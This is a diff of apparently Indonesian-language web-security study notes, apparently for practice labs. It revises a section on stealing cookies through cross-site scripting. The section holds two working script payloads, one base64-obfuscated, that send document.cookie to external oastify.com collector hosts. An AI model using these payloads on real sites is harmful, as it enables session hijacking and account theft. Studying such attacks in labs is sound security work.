@@ -132,10 +132,10 @@ link tag canonical pada `<head>` memungkinkan terjadinya XSS dengan menambahkan 
 
 ### Exploiting cross-site scripting to steal cookies
 **Payload**:
-```js
+```html
 <script>var i=new Image(); i.src="http://z99oqbqbw51wp1w0xw0fu7uau10soic7.oastify.com/?cookie="+btoa(document.cookie);</script>
 
-<script>eval(atob('dmFyIHhocj1uZXcgWE1MSHR0cFJlcXVlc3QoKTsKeGhyLm9wZW4oIkdFVCIsICJodHRwczovL3o5OW9xYnFidzUxd3AxdzB4dzBmdTd1YXUxMHNvaWM3Lm9hc3RpZnkuY29tLz8iK2RvY3VtZW50LmNvb2tpZSwgdHJ1ZSk7Cnhoci5zZW5kKCk7'))</script>
+<script>eval(atob('dmFyIHhocj1uZXcgWE1MSHR0cFJlcXVlc3QoKTsKeGhyLm9wZW4oIkdFVCIsICJodHRwczovL2l0ZnNmZGRrdnV5b3FnZW5sYWd0ZGluenZxMWhwN2R3Lm9hc3RpZnkuY29tLz8iK2RvY3VtZW50LmNvb2tpZSwgdHJ1ZSk7Cnhoci5zZW5kKCk7'))</script>
 ```
 
 ### Exploiting cross-site scripting to capture passwords
